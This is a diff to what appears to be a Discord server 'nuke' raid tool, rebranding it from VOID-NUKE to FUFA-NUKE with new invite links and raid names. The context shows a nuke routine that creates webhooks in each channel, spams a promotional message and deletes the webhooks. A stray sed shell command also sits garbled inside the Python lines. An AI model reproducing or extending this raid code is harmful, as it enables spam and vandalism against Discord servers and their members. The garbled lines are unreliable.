@@ -24,7 +24,7 @@ DISCORD_URL  = "https://discord.gg/xn4vNQNqjh"
 DISCORD_TAG  = "discord.gg/xn4vNQNqjh"
 sed -i '25c\PUB = f"FUFA-NUKE | {TELEGRAM_TAG} | {DISCORD_TAG}"' main.py
 PUB_SHORT    = f"{TELEGRAM_TAG} · {DISCORD_TAG} 
-RAID_NAME   = "fuxed-by-rc"
+RAID_NAME   = "fuxed-by-fufa"
 TOOL_NAME   = "FUFA-NUKE"
 
 AUTO_RAID_CONFIG = {
@@ -354,9 +354,9 @@ async def nuke(sid):
     fx_load("webhook spam", 22, .014)
     async def _raid_chan(chan):
         try:
-            wh = await chan.create_webhook(name="VOID-NUKE TOOLS")
+            wh = await chan.create_webhook(name="FUFA-NUKE TOOLS")
             for _ in range(5):
-                try: await wh.send(content=PUB, username="VOID-NUKE TOOLS")
+                try: await wh.send(content=PUB, username="FUFA-NUKE TOOLS")
                 except: pass
             try: await wh.delete()
             except: pass
